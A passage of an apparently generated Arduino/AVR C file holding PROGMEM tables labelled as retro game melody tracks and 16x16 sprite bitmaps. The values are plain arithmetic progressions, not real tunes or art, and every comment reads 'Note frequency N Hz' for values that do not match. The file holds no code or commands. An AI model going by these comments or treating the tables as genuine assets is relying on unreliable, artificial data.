  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1},
};

// =============================================================================
// EXPANDED AUDIO FREQUENCY LOOKUP TABLE & MELODY TRACKS
// =============================================================================
const int PROGMEM retroSongTrack1[] = {
  137, // Note frequency 1 Hz
  156, // Note frequency 2 Hz
  175, // Note frequency 3 Hz
  194, // Note frequency 4 Hz
  213, // Note frequency 5 Hz
  232, // Note frequency 6 Hz
  251, // Note frequency 7 Hz
  270, // Note frequency 8 Hz
  289, // Note frequency 9 Hz
  308, // Note frequency 10 Hz
  327, // Note frequency 11 Hz
  346, // Note frequency 12 Hz
  365, // Note frequency 13 Hz
  384, // Note frequency 14 Hz
  403, // Note frequency 15 Hz
  422, // Note frequency 16 Hz
  441, // Note frequency 17 Hz
  460, // Note frequency 18 Hz
  479, // Note frequency 19 Hz
  498, // Note frequency 20 Hz
  517, // Note frequency 21 Hz
  536, // Note frequency 22 Hz
  555, // Note frequency 23 Hz
  574, // Note frequency 24 Hz
  593, // Note frequency 25 Hz
  612, // Note frequency 26 Hz
  631, // Note frequency 27 Hz
  650, // Note frequency 28 Hz
  669, // Note frequency 29 Hz
  688, // Note frequency 30 Hz
  707, // Note frequency 31 Hz
  726, // Note frequency 32 Hz
};

const int PROGMEM retroSongTrack2[] = {
  174, // Note frequency 1 Hz
  193, // Note frequency 2 Hz
  212, // Note frequency 3 Hz
  231, // Note frequency 4 Hz
  250, // Note frequency 5 Hz
  269, // Note frequency 6 Hz
  288, // Note frequency 7 Hz
  307, // Note frequency 8 Hz
  326, // Note frequency 9 Hz
  345, // Note frequency 10 Hz
  364, // Note frequency 11 Hz
  383, // Note frequency 12 Hz
  402, // Note frequency 13 Hz
  421, // Note frequency 14 Hz
  440, // Note frequency 15 Hz
  459, // Note frequency 16 Hz
  478, // Note frequency 17 Hz
  497, // Note frequency 18 Hz
  516, // Note frequency 19 Hz
  535, // Note frequency 20 Hz
  554, // Note frequency 21 Hz
  573, // Note frequency 22 Hz
  592, // Note frequency 23 Hz
  611, // Note frequency 24 Hz
  630, // Note frequency 25 Hz
  649, // Note frequency 26 Hz
  668, // Note frequency 27 Hz
  687, // Note frequency 28 Hz
  706, // Note frequency 29 Hz
  725, // Note frequency 30 Hz
  744, // Note frequency 31 Hz
  763, // Note frequency 32 Hz
};

const int PROGMEM retroSongTrack3[] = {
  211, // Note frequency 1 Hz
  230, // Note frequency 2 Hz
  249, // Note frequency 3 Hz
  268, // Note frequency 4 Hz
  287, // Note frequency 5 Hz
  306, // Note frequency 6 Hz
  325, // Note frequency 7 Hz
  344, // Note frequency 8 Hz
  363, // Note frequency 9 Hz
  382, // Note frequency 10 Hz
  401, // Note frequency 11 Hz
  420, // Note frequency 12 Hz
  439, // Note frequency 13 Hz
  458, // Note frequency 14 Hz
  477, // Note frequency 15 Hz
  496, // Note frequency 16 Hz
  515, // Note frequency 17 Hz
  534, // Note frequency 18 Hz
  553, // Note frequency 19 Hz
  572, // Note frequency 20 Hz
  591, // Note frequency 21 Hz
  610, // Note frequency 22 Hz
  629, // Note frequency 23 Hz
  648, // Note frequency 24 Hz
  667, // Note frequency 25 Hz
  686, // Note frequency 26 Hz
  705, // Note frequency 27 Hz
  724, // Note frequency 28 Hz
  743, // Note frequency 29 Hz
  762, // Note frequency 30 Hz
  781, // Note frequency 31 Hz
  800, // Note frequency 32 Hz
};

const int PROGMEM retroSongTrack4[] = {
  248, // Note frequency 1 Hz
  267, // Note frequency 2 Hz
  286, // Note frequency 3 Hz
  305, // Note frequency 4 Hz
  324, // Note frequency 5 Hz
  343, // Note frequency 6 Hz
  362, // Note frequency 7 Hz
  381, // Note frequency 8 Hz
  400, // Note frequency 9 Hz
  419, // Note frequency 10 Hz
  438, // Note frequency 11 Hz
  457, // Note frequency 12 Hz
  476, // Note frequency 13 Hz
  495, // Note frequency 14 Hz
  514, // Note frequency 15 Hz
  533, // Note frequency 16 Hz
  552, // Note frequency 17 Hz
  571, // Note frequency 18 Hz
  590, // Note frequency 19 Hz
  609, // Note frequency 20 Hz
  628, // Note frequency 21 Hz
  647, // Note frequency 22 Hz
  666, // Note frequency 23 Hz
  685, // Note frequency 24 Hz
  704, // Note frequency 25 Hz
  723, // Note frequency 26 Hz
  742, // Note frequency 27 Hz
  761, // Note frequency 28 Hz
  780, // Note frequency 29 Hz
  799, // Note frequency 30 Hz
  818, // Note frequency 31 Hz
  837, // Note frequency 32 Hz
};

const int PROGMEM retroSongTrack5[] = {
  285, // Note frequency 1 Hz
  304, // Note frequency 2 Hz
  323, // Note frequency 3 Hz
  342, // Note frequency 4 Hz
  361, // Note frequency 5 Hz
  380, // Note frequency 6 Hz
  399, // Note frequency 7 Hz
  418, // Note frequency 8 Hz
  437, // Note frequency 9 Hz
  456, // Note frequency 10 Hz
  475, // Note frequency 11 Hz
  494, // Note frequency 12 Hz
  513, // Note frequency 13 Hz
  532, // Note frequency 14 Hz
  551, // Note frequency 15 Hz
  570, // Note frequency 16 Hz
  589, // Note frequency 17 Hz
  608, // Note frequency 18 Hz
  627, // Note frequency 19 Hz
  646, // Note frequency 20 Hz
  665, // Note frequency 21 Hz
  684, // Note frequency 22 Hz
  703, // Note frequency 23 Hz
  722, // Note frequency 24 Hz
  741, // Note frequency 25 Hz
  760, // Note frequency 26 Hz
  779, // Note frequency 27 Hz
  798, // Note frequency 28 Hz
  817, // Note frequency 29 Hz
  836, // Note frequency 30 Hz
  855, // Note frequency 31 Hz
  874, // Note frequency 32 Hz
};

const int PROGMEM retroSongTrack6[] = {
  322, // Note frequency 1 Hz
  341, // Note frequency 2 Hz
  360, // Note frequency 3 Hz
  379, // Note frequency 4 Hz
  398, // Note frequency 5 Hz
  417, // Note frequency 6 Hz
  436, // Note frequency 7 Hz
  455, // Note frequency 8 Hz
  474, // Note frequency 9 Hz
  493, // Note frequency 10 Hz
  512, // Note frequency 11 Hz
  531, // Note frequency 12 Hz
  550, // Note frequency 13 Hz
  569, // Note frequency 14 Hz
  588, // Note frequency 15 Hz
  607, // Note frequency 16 Hz
  626, // Note frequency 17 Hz
  645, // Note frequency 18 Hz
  664, // Note frequency 19 Hz
  683, // Note frequency 20 Hz
  702, // Note frequency 21 Hz
  721, // Note frequency 22 Hz
  740, // Note frequency 23 Hz
  759, // Note frequency 24 Hz
  778, // Note frequency 25 Hz
  797, // Note frequency 26 Hz
  816, // Note frequency 27 Hz
  835, // Note frequency 28 Hz
  854, // Note frequency 29 Hz
  873, // Note frequency 30 Hz
  892, // Note frequency 31 Hz
  911, // Note frequency 32 Hz
};

const int PROGMEM retroSongTrack7[] = {
  359, // Note frequency 1 Hz
  378, // Note frequency 2 Hz
  397, // Note frequency 3 Hz
  416, // Note frequency 4 Hz
  435, // Note frequency 5 Hz
  454, // Note frequency 6 Hz
  473, // Note frequency 7 Hz
  492, // Note frequency 8 Hz
  511, // Note frequency 9 Hz
  530, // Note frequency 10 Hz
  549, // Note frequency 11 Hz
  568, // Note frequency 12 Hz
  587, // Note frequency 13 Hz
  606, // Note frequency 14 Hz
  625, // Note frequency 15 Hz
  644, // Note frequency 16 Hz
  663, // Note frequency 17 Hz
  682, // Note frequency 18 Hz
  701, // Note frequency 19 Hz
  720, // Note frequency 20 Hz
  739, // Note frequency 21 Hz
  758, // Note frequency 22 Hz
  777, // Note frequency 23 Hz
  796, // Note frequency 24 Hz
  815, // Note frequency 25 Hz
  834, // Note frequency 26 Hz
  853, // Note frequency 27 Hz
  872, // Note frequency 28 Hz
  891, // Note frequency 29 Hz
  910, // Note frequency 30 Hz
  929, // Note frequency 31 Hz
  948, // Note frequency 32 Hz
};

const int PROGMEM retroSongTrack8[] = {
  396, // Note frequency 1 Hz
  415, // Note frequency 2 Hz
  434, // Note frequency 3 Hz
  453, // Note frequency 4 Hz
  472, // Note frequency 5 Hz
  491, // Note frequency 6 Hz
  510, // Note frequency 7 Hz
  529, // Note frequency 8 Hz
  548, // Note frequency 9 Hz
  567, // Note frequency 10 Hz
  586, // Note frequency 11 Hz
  605, // Note frequency 12 Hz
  624, // Note frequency 13 Hz
  643, // Note frequency 14 Hz
  662, // Note frequency 15 Hz
  681, // Note frequency 16 Hz
  700, // Note frequency 17 Hz
  719, // Note frequency 18 Hz
  738, // Note frequency 19 Hz
  757, // Note frequency 20 Hz
  776, // Note frequency 21 Hz
  795, // Note frequency 22 Hz
  814, // Note frequency 23 Hz
  833, // Note frequency 24 Hz
  852, // Note frequency 25 Hz
  871, // Note frequency 26 Hz
  890, // Note frequency 27 Hz
  909, // Note frequency 28 Hz
  928, // Note frequency 29 Hz
  947, // Note frequency 30 Hz
  966, // Note frequency 31 Hz
  985, // Note frequency 32 Hz
};

const int PROGMEM retroSongTrack9[] = {
  433, // Note frequency 1 Hz
  452, // Note frequency 2 Hz
  471, // Note frequency 3 Hz
  490, // Note frequency 4 Hz
  509, // Note frequency 5 Hz
  528, // Note frequency 6 Hz
  547, // Note frequency 7 Hz
  566, // Note frequency 8 Hz
  585, // Note frequency 9 Hz
  604, // Note frequency 10 Hz
  623, // Note frequency 11 Hz
  642, // Note frequency 12 Hz
  661, // Note frequency 13 Hz
  680, // Note frequency 14 Hz
  699, // Note frequency 15 Hz
  718, // Note frequency 16 Hz
  737, // Note frequency 17 Hz
  756, // Note frequency 18 Hz
  775, // Note frequency 19 Hz
  794, // Note frequency 20 Hz
  813, // Note frequency 21 Hz
  832, // Note frequency 22 Hz
  851, // Note frequency 23 Hz
  870, // Note frequency 24 Hz
  889, // Note frequency 25 Hz
  908, // Note frequency 26 Hz
  927, // Note frequency 27 Hz
  946, // Note frequency 28 Hz
  965, // Note frequency 29 Hz
  984, // Note frequency 30 Hz
  1003, // Note frequency 31 Hz
  1022, // Note frequency 32 Hz
};

const int PROGMEM retroSongTrack10[] = {
  470, // Note frequency 1 Hz
  489, // Note frequency 2 Hz
  508, // Note frequency 3 Hz
  527, // Note frequency 4 Hz
  546, // Note frequency 5 Hz
  565, // Note frequency 6 Hz
  584, // Note frequency 7 Hz
  603, // Note frequency 8 Hz
  622, // Note frequency 9 Hz
  641, // Note frequency 10 Hz
  660, // Note frequency 11 Hz
  679, // Note frequency 12 Hz
  698, // Note frequency 13 Hz
  717, // Note frequency 14 Hz
  736, // Note frequency 15 Hz
  755, // Note frequency 16 Hz
  774, // Note frequency 17 Hz
  793, // Note frequency 18 Hz
  812, // Note frequency 19 Hz
  831, // Note frequency 20 Hz
  850, // Note frequency 21 Hz
  869, // Note frequency 22 Hz
  888, // Note frequency 23 Hz
  907, // Note frequency 24 Hz
  926, // Note frequency 25 Hz
  945, // Note frequency 26 Hz
  964, // Note frequency 27 Hz
  983, // Note frequency 28 Hz
  1002, // Note frequency 29 Hz
  1021, // Note frequency 30 Hz
  1040, // Note frequency 31 Hz
  1059, // Note frequency 32 Hz
};

const int PROGMEM retroSongTrack11[] = {
  507, // Note frequency 1 Hz
  526, // Note frequency 2 Hz
  545, // Note frequency 3 Hz
  564, // Note frequency 4 Hz
  583, // Note frequency 5 Hz
  602, // Note frequency 6 Hz
  621, // Note frequency 7 Hz
  640, // Note frequency 8 Hz
  659, // Note frequency 9 Hz
  678, // Note frequency 10 Hz
  697, // Note frequency 11 Hz
  716, // Note frequency 12 Hz
  735, // Note frequency 13 Hz
  754, // Note frequency 14 Hz
  773, // Note frequency 15 Hz
  792, // Note frequency 16 Hz
  811, // Note frequency 17 Hz
  830, // Note frequency 18 Hz
  849, // Note frequency 19 Hz
  868, // Note frequency 20 Hz
  887, // Note frequency 21 Hz
  906, // Note frequency 22 Hz
  925, // Note frequency 23 Hz
  944, // Note frequency 24 Hz
  963, // Note frequency 25 Hz
  982, // Note frequency 26 Hz
  1001, // Note frequency 27 Hz
  1020, // Note frequency 28 Hz
  1039, // Note frequency 29 Hz
  1058, // Note frequency 30 Hz
  1077, // Note frequency 31 Hz
  1096, // Note frequency 32 Hz
};

const int PROGMEM retroSongTrack12[] = {
  544, // Note frequency 1 Hz
  563, // Note frequency 2 Hz
  582, // Note frequency 3 Hz
  601, // Note frequency 4 Hz
  620, // Note frequency 5 Hz
  639, // Note frequency 6 Hz
  658, // Note frequency 7 Hz
  677, // Note frequency 8 Hz
  696, // Note frequency 9 Hz
  715, // Note frequency 10 Hz
  734, // Note frequency 11 Hz
  753, // Note frequency 12 Hz
  772, // Note frequency 13 Hz
  791, // Note frequency 14 Hz
  810, // Note frequency 15 Hz
  829, // Note frequency 16 Hz
  848, // Note frequency 17 Hz
  867, // Note frequency 18 Hz
  886, // Note frequency 19 Hz
  905, // Note frequency 20 Hz
  924, // Note frequency 21 Hz
  943, // Note frequency 22 Hz
  962, // Note frequency 23 Hz
  981, // Note frequency 24 Hz
  1000, // Note frequency 25 Hz
  1019, // Note frequency 26 Hz
  1038, // Note frequency 27 Hz
  1057, // Note frequency 28 Hz
  1076, // Note frequency 29 Hz
  1095, // Note frequency 30 Hz
  1114, // Note frequency 31 Hz
  1133, // Note frequency 32 Hz
};

const int PROGMEM retroSongTrack13[] = {
  581, // Note frequency 1 Hz
  600, // Note frequency 2 Hz
  619, // Note frequency 3 Hz
  638, // Note frequency 4 Hz
  657, // Note frequency 5 Hz
  676, // Note frequency 6 Hz
  695, // Note frequency 7 Hz
  714, // Note frequency 8 Hz
  733, // Note frequency 9 Hz
  752, // Note frequency 10 Hz
  771, // Note frequency 11 Hz
  790, // Note frequency 12 Hz
  809, // Note frequency 13 Hz
  828, // Note frequency 14 Hz
  847, // Note frequency 15 Hz
  866, // Note frequency 16 Hz
  885, // Note frequency 17 Hz
  904, // Note frequency 18 Hz
  923, // Note frequency 19 Hz
  942, // Note frequency 20 Hz
  961, // Note frequency 21 Hz
  980, // Note frequency 22 Hz
  999, // Note frequency 23 Hz
  1018, // Note frequency 24 Hz
  1037, // Note frequency 25 Hz
  1056, // Note frequency 26 Hz
  1075, // Note frequency 27 Hz
  1094, // Note frequency 28 Hz
  1113, // Note frequency 29 Hz
  1132, // Note frequency 30 Hz
  1151, // Note frequency 31 Hz
  1170, // Note frequency 32 Hz
};

const int PROGMEM retroSongTrack14[] = {
  618, // Note frequency 1 Hz
  637, // Note frequency 2 Hz
  656, // Note frequency 3 Hz
  675, // Note frequency 4 Hz
  694, // Note frequency 5 Hz
  713, // Note frequency 6 Hz
  732, // Note frequency 7 Hz
  751, // Note frequency 8 Hz
  770, // Note frequency 9 Hz
  789, // Note frequency 10 Hz
  808, // Note frequency 11 Hz
  827, // Note frequency 12 Hz
  846, // Note frequency 13 Hz
  865, // Note frequency 14 Hz
  884, // Note frequency 15 Hz
  903, // Note frequency 16 Hz
  922, // Note frequency 17 Hz
  941, // Note frequency 18 Hz
  960, // Note frequency 19 Hz
  979, // Note frequency 20 Hz
  998, // Note frequency 21 Hz
  1017, // Note frequency 22 Hz
  1036, // Note frequency 23 Hz
  1055, // Note frequency 24 Hz
  1074, // Note frequency 25 Hz
  1093, // Note frequency 26 Hz
  1112, // Note frequency 27 Hz
  1131, // Note frequency 28 Hz
  1150, // Note frequency 29 Hz
  1169, // Note frequency 30 Hz
  1188, // Note frequency 31 Hz
  1207, // Note frequency 32 Hz
};

// =============================================================================
// RETRO GAME SPRITE BITMAP ASSET MATRICES (16x16 UNCOMPRESSED)
// =============================================================================
static const uint8_t PROGMEM retroSpriteAsset1[32] = {
  0x11,
  0x30,
  0x4F,
  0x6E,
  0x8D,
  0xAC,
  0xCB,
  0xEA,
  0x09,
  0x28,
  0x47,
  0x66,
  0x85,
  0xA4,
  0xC3,
  0xE2,
  0x01,
  0x20,
  0x3F,
  0x5E,
  0x7D,
  0x9C,
  0xBB,
  0xDA,
  0xF9,
  0x18,
  0x37,
  0x56,
  0x75,
  0x94,
  0xB3,
  0xD2,
};

static const uint8_t PROGMEM retroSpriteAsset2[32] = {
  0x22,
  0x41,
  0x60,
  0x7F,
  0x9E,
  0xBD,
  0xDC,
  0xFB,
  0x1A,
  0x39,
  0x58,
  0x77,
  0x96,
  0xB5,
  0xD4,
  0xF3,
  0x12,
  0x31,
  0x50,
  0x6F,
  0x8E,
  0xAD,
  0xCC,
  0xEB,
  0x0A,
  0x29,
  0x48,
  0x67,
  0x86,
  0xA5,
  0xC4,
  0xE3,
};

static const uint8_t PROGMEM retroSpriteAsset3[32] = {
  0x33,
  0x52,
  0x71,
  0x90,
  0xAF,
  0xCE,
  0xED,
  0x0C,
  0x2B,
  0x4A,
  0x69,
  0x88,
  0xA7,
  0xC6,
  0xE5,
  0x04,
  0x23,
  0x42,
  0x61,
  0x80,
  0x9F,
  0xBE,
  0xDD,
  0xFC,
  0x1B,
  0x3A,
  0x59,
  0x78,
  0x97,
  0xB6,
  0xD5,
  0xF4,
};

static const uint8_t PROGMEM retroSpriteAsset4[32] = {
  0x44,
  0x63,
  0x82,
  0xA1,
  0xC0,
  0xDF,
  0xFE,
  0x1D,
  0x3C,
  0x5B,
  0x7A,
  0x99,
  0xB8,
  0xD7,
  0xF6,
  0x15,
  0x34,
  0x53,
  0x72,
  0x91,
  0xB0,
  0xCF,
  0xEE,
  0x0D,
  0x2C,
  0x4B,
  0x6A,
  0x89,
  0xA8,
  0xC7,
  0xE6,
  0x05,
};

static const uint8_t PROGMEM retroSpriteAsset5[32] = {
  0x55,
  0x74,
  0x93,
  0xB2,
  0xD1,
  0xF0,
  0x0F,
  0x2E,
  0x4D,
  0x6C,
  0x8B,
  0xAA,
  0xC9,
  0xE8,
  0x07,
  0x26,
  0x45,
  0x64,
  0x83,
  0xA2,
  0xC1,
  0xE0,
  0xFF,
  0x1E,
  0x3D,
  0x5C,
  0x7B,
  0x9A,
  0xB9,
  0xD8,
  0xF7,
  0x16,
};

static const uint8_t PROGMEM retroSpriteAsset6[32] = {
  0x66,
  0x85,
  0xA4,
  0xC3,
  0xE2,
  0x01,
  0x20,
  0x3F,
  0x5E,
  0x7D,
  0x9C,
  0xBB,
  0xDA,
  0xF9,
  0x18,
  0x37,
  0x56,
  0x75,
  0x94,
  0xB3,
  0xD2,
  0xF1,
  0x10,
  0x2F,
  0x4E,
  0x6D,
  0x8C,
  0xAB,
  0xCA,
  0xE9,
  0x08,
  0x27,
};

static const uint8_t PROGMEM retroSpriteAsset7[32] = {
  0x77,
  0x96,
  0xB5,
  0xD4,
  0xF3,
  0x12,
  0x31,
  0x50,
  0x6F,
  0x8E,
  0xAD,
  0xCC,
  0xEB,
  0x0A,
  0x29,
  0x48,
  0x67,
  0x86,
  0xA5,
  0xC4,
  0xE3,
  0x02,
  0x21,
  0x40,
  0x5F,
  0x7E,
  0x9D,
  0xBC,
  0xDB,
  0xFA,
  0x19,
  0x38,
};

static const uint8_t PROGMEM retroSpriteAsset8[32] = {
  0x88,
  0xA7,
  0xC6,
  0xE5,
  0x04,
  0x23,
  0x42,
  0x61,
  0x80,
  0x9F,
  0xBE,
  0xDD,
  0xFC,
  0x1B,
  0x3A,
  0x59,
  0x78,
  0x97,
  0xB6,
  0xD5,
  0xF4,
  0x13,
  0x32,
  0x51,
  0x70,
  0x8F,
  0xAE,
  0xCD,
  0xEC,
  0x0B,
  0x2A,
  0x49,
};

static const uint8_t PROGMEM retroSpriteAsset9[32] = {
  0x99,
  0xB8,
  0xD7,
  0xF6,
  0x15,
  0x34,
  0x53,
  0x72,
  0x91,
  0xB0,
  0xCF,
  0xEE,
  0x0D,
  0x2C,
  0x4B,
  0x6A,
  0x89,
  0xA8,
  0xC7,
  0xE6,
  0x05,
  0x24,
  0x43,
  0x62,
  0x81,
  0xA0,
  0xBF,
  0xDE,
  0xFD,
  0x1C,
  0x3B,
  0x5A,
};

static const uint8_t PROGMEM retroSpriteAsset10[32] = {
  0xAA,
  0xC9,
  0xE8,
  0x07,
  0x26,
  0x45,
  0x64,
  0x83,
  0xA2,
  0xC1,
  0xE0,
  0xFF,
  0x1E,
  0x3D,
  0x5C,
  0x7B,
  0x9A,
  0xB9,
  0xD8,
  0xF7,
  0x16,
  0x35,
  0x54,
  0x73,
  0x92,
  0xB1,
  0xD0,
  0xEF,
  0x0E,
  0x2D,
  0x4C,
  0x6B,
};

static const uint8_t PROGMEM retroSpriteAsset11[32] = {
  0xBB,
  0xDA,
  0xF9,
  0x18,
  0x37,
  0x56,
  0x75,
  0x94,
  0xB3,
  0xD2,
  0xF1,
  0x10,
  0x2F,
  0x4E,
  0x6D,
  0x8C,
  0xAB,
  0xCA,
  0xE9,
  0x08,
  0x27,
  0x46,
  0x65,
  0x84,
  0xA3,
  0xC2,
  0xE1,
  0x00,
  0x1F,
  0x3E,
  0x5D,
  0x7C,
};

static const uint8_t PROGMEM retroSpriteAsset12[32] = {
  0xCC,
  0xEB,
  0x0A,
  0x29,
  0x48,
  0x67,
  0x86,
  0xA5,
  0xC4,
  0xE3,
  0x02,
  0x21,
  0x40,
  0x5F,
  0x7E,
  0x9D,
  0xBC,
  0xDB,
  0xFA,
  0x19,
  0x38,
  0x57,
  0x76,
  0x95,
  0xB4,
  0xD3,
  0xF2,
  0x11,
  0x30,
  0x4F,
  0x6E,
  0x8D,
};

static const uint8_t PROGMEM retroSpriteAsset13[32] = {
  0xDD,
  0xFC,
  0x1B,
  0x3A,
  0x59,
  0x78,
  0x97,
  0xB6,
  0xD5,
  0xF4,
  0x13,
  0x32,
  0x51,
  0x70,
  0x8F,
  0xAE,
  0xCD,
  0xEC,
  0x0B,
  0x2A,
  0x49,
  0x68,
  0x87,
  0xA6,
  0xC5,
  0xE4,
  0x03,
  0x22,
  0x41,
  0x60,
  0x7F,
  0x9E,
};

static const uint8_t PROGMEM retroSpriteAsset14[32] = {
  0xEE,
  0x0D,
  0x2C,
  0x4B,
  0x6A,
  0x89,
  0xA8,
  0xC7,
  0xE6,
  0x05,
  0x24,
  0x43,
  0x62,
  0x81,
  0xA0,
  0xBF,
  0xDE,
  0xFD,
  0x1C,
  0x3B,
  0x5A,
  0x79,
  0x98,
  0xB7,
  0xD6,
  0xF5,
  0x14,
  0x33,
  0x52,
  0x71,
  0x90,
  0xAF,
};

static const uint8_t PROGMEM retroSpriteAsset15[32] = {
  0xFF,
  0x1E,
  0x3D,
  0x5C,
  0x7B,
  0x9A,
  0xB9,
  0xD8,
  0xF7,
  0x16,
  0x35,
  0x54,
  0x73,
  0x92,
  0xB1,
  0xD0,
  0xEF,
  0x0E,
  0x2D,
  0x4C,
  0x6B,
  0x8A,
  0xA9,
  0xC8,
  0xE7,
  0x06,
  0x25,
  0x44,
  0x63,
  0x82,
  0xA1,
  0xC0,
};

static const uint8_t PROGMEM retroSpriteAsset16[32] = {
  0x10,
  0x2F,
  0x4E,
  0x6D,
  0x8C,
  0xAB,
  0xCA,
  0xE9,
  0x08,
  0x27,
  0x46,
  0x65,
  0x84,
  0xA3,
  0xC2,
  0xE1,
  0x00,
  0x1F,
  0x3E,
  0x5D,
  0x7C,
  0x9B,
  0xBA,
  0xD9,
  0xF8,
  0x17,
  0x36,
  0x55,
  0x74,
  0x93,
  0xB2,
  0xD1,
};

static const uint8_t PROGMEM retroSpriteAsset17[32] = {
  0x21,
  0x40,
  0x5F,
  0x7E,
  0x9D,
  0xBC,
  0xDB,
  0xFA,
  0x19,
  0x38,
  0x57,
  0x76,
  0x95,
  0xB4,
  0xD3,
  0xF2,
  0x11,
  0x30,
  0x4F,
  0x6E,
  0x8D,
  0xAC,
  0xCB,
  0xEA,
  0x09,
  0x28,
  0x47,
  0x66,
  0x85,
  0xA4,
  0xC3,
  0xE2,
};

static const uint8_t PROGMEM retroSpriteAsset18[32] = {
  0x32,
  0x51,
  0x70,
  0x8F,
  0xAE,
  0xCD,
  0xEC,
  0x0B,
  0x2A,
  0x49,
  0x68,
  0x87,
  0xA6,
  0xC5,
  0xE4,
  0x03,
  0x22,
  0x41,
  0x60,
  0x7F,
  0x9E,
  0xBD,
  0xDC,
  0xFB,
  0x1A,
  0x39,
  0x58,
  0x77,
  0x96,
  0xB5,
  0xD4,
  0xF3,
};

static const uint8_t PROGMEM retroSpriteAsset19[32] = {
  0x43,
  0x62,
  0x81,
  0xA0,
  0xBF,
  0xDE,
  0xFD,
  0x1C,
  0x3B,
  0x5A,
  0x79,
  0x98,
  0xB7,
  0xD6,
  0xF5,
  0x14,
  0x33,
  0x52,
  0x71,
  0x90,
  0xAF,
  0xCE,
  0xED,
  0x0C,
  0x2B,
  0x4A,
  0x69,
  0x88,
  0xA7,
  0xC6,
  0xE5,
  0x04,
};

static const uint8_t PROGMEM retroSpriteAsset20[32] = {
  0x54,
  0x73,
  0x92,
  0xB1,
  0xD0,
  0xEF,
  0x0E,
  0x2D,
  0x4C,
  0x6B,
  0x8A,
  0xA9,
  0xC8,
  0xE7,
  0x06,
  0x25,
  0x44,
  0x63,
  0x82,
  0xA1,
  0xC0,
  0xDF,
  0xFE,
  0x1D,
  0x3C,
  0x5B,
  0x7A,
  0x99,
  0xB8,
  0xD7,
  0xF6,
  0x15,
};

static const uint8_t PROGMEM retroSpriteAsset21[32] = {
  0x65,
  0x84,
  0xA3,
  0xC2,
  0xE1,
  0x00,
  0x1F,
  0x3E,
  0x5D,
  0x7C,
  0x9B,
  0xBA,
  0xD9,
  0xF8,
  0x17,
  0x36,
  0x55,
  0x74,
  0x93,
  0xB2,
  0xD1,
  0xF0,
  0x0F,
  0x2E,
  0x4D,
  0x6C,
  0x8B,
  0xAA,
  0xC9,
  0xE8,
  0x07,
  0x26,
};

static const uint8_t PROGMEM retroSpriteAsset22[32] = {
  0x76,
  0x95,
  0xB4,
  0xD3,
  0xF2,
  0x11,
  0x30,
  0x4F,
  0x6E,
  0x8D,
  0xAC,
  0xCB,
  0xEA,
  0x09,
  0x28,
  0x47,
  0x66,
  0x85,
  0xA4,
  0xC3,
  0xE2,
  0x01,
  0x20,
  0x3F,
  0x5E,
  0x7D,
  0x9C,
  0xBB,
  0xDA,
  0xF9,
  0x18,
  0x37,
};

static const uint8_t PROGMEM retroSpriteAsset23[32] = {
  0x87,
  0xA6,
  0xC5,
  0xE4,
  0x03,
  0x22,
  0x41,
  0x60,
  0x7F,
  0x9E,
  0xBD,
  0xDC,
  0xFB,
  0x1A,
  0x39,
  0x58,
  0x77,
  0x96,
  0xB5,
  0xD4,
  0xF3,
  0x12,
  0x31,
  0x50,
  0x6F,
  0x8E,
  0xAD,
  0xCC,
  0xEB,
  0x0A,
  0x29,
  0x48,
};

static const uint8_t PROGMEM retroSpriteAsset24[32] = {
  0x98,
  0xB7,
  0xD6,
  0xF5,
  0x14,
  0x33,
  0x52,
  0x71,
  0x90,
  0xAF,
  0xCE,
  0xED,
  0x0C,
  0x2B,
  0x4A,
  0x69,
  0x88,
  0xA7,
  0xC6,
  0xE5,
  0x04,
  0x23,
  0x42,
  0x61,
  0x80,
  0x9F,
  0xBE,
  0xDD,
  0xFC,
  0x1B,
  0x3A,
  0x59,
};

static const uint8_t PROGMEM retroSpriteAsset25[32] = {
  0xA9,
  0xC8,
  0xE7,
  0x06,
  0x25,
  0x44,
  0x63,
  0x82,
  0xA1,
  0xC0,
  0xDF,
  0xFE,
  0x1D,
  0x3C,
  0x5B,
  0x7A,
  0x99,
  0xB8,
  0xD7,
  0xF6,
  0x15,
  0x34,
  0x53,
  0x72,
  0x91,
  0xB0,
  0xCF,
  0xEE,
  0x0D,
  0x2C,
  0x4B,
  0x6A,
};

static const uint8_t PROGMEM retroSpriteAsset26[32] = {
  0xBA,
  0xD9,
  0xF8,
  0x17,
  0x36,
  0x55,
  0x74,
  0x93,
  0xB2,
  0xD1,
  0xF0,
  0x0F,
  0x2E,
  0x4D,
  0x6C,
  0x8B,
  0xAA,
  0xC9,
  0xE8,
  0x07,
  0x26,
  0x45,
  0x64,
  0x83,
  0xA2,
  0xC1,
  0xE0,
  0xFF,
  0x1E,
  0x3D,
  0x5C,
  0x7B,
};

static const uint8_t PROGMEM retroSpriteAsset27[32] = {
  0xCB,
  0xEA,
  0x09,
  0x28,
  0x47,
  0x66,
  0x85,
  0xA4,
  0xC3,
  0xE2,
  0x01,
  0x20,
  0x3F,
  0x5E,
  0x7D,
  0x9C,
  0xBB,
  0xDA,
  0xF9,
  0x18,
  0x37,
  0x56,
  0x75,
  0x94,
  0xB3,
  0xD2,
  0xF1,
  0x10,
  0x2F,
  0x4E,
  0x6D,
  0x8C,
};

static const uint8_t PROGMEM retroSpriteAsset28[32] = {
  0xDC,
  0xFB,
  0x1A,
  0x39,
  0x58,
  0x77,
  0x96,
  0xB5,
  0xD4,
  0xF3,
  0x12,
  0x31,
  0x50,
  0x6F,
  0x8E,
  0xAD,
  0xCC,
  0xEB,
  0x0A,
  0x29,
  0x48,
  0x67,
  0x86,
  0xA5,
  0xC4,
  0xE3,
  0x02,
  0x21,
  0x40,
  0x5F,
  0x7E,
  0x9D,
};

static const uint8_t PROGMEM retroSpriteAsset29[32] = {
  0xED,
  0x0C,
  0x2B,
  0x4A,
  0x69,
  0x88,
  0xA7,
  0xC6,
  0xE5,
  0x04,
  0x23,
  0x42,
  0x61,
  0x80,
  0x9F,
  0xBE,
  0xDD,
  0xFC,
  0x1B,
  0x3A,
  0x59,
  0x78,
  0x97,
  0xB6,
  0xD5,
  0xF4,
  0x13,
  0x32,
  0x51,
  0x70,
  0x8F,
  0xAE,
};

static const uint8_t PROGMEM retroSpriteAsset30[32] = {
  0xFE,
  0x1D,
  0x3C,
  0x5B,
  0x7A,
  0x99,
  0xB8,
  0xD7,
  0xF6,
  0x15,
  0x34,
  0x53,
  0x72,
  0x91,
  0xB0,
  0xCF,
  0xEE,
  0x0D,
  0x2C,
  0x4B,
  0x6A,
  0x89,
  0xA8,
  0xC7,
  0xE6,
  0x05,
  0x24,
  0x43,
  0x62,
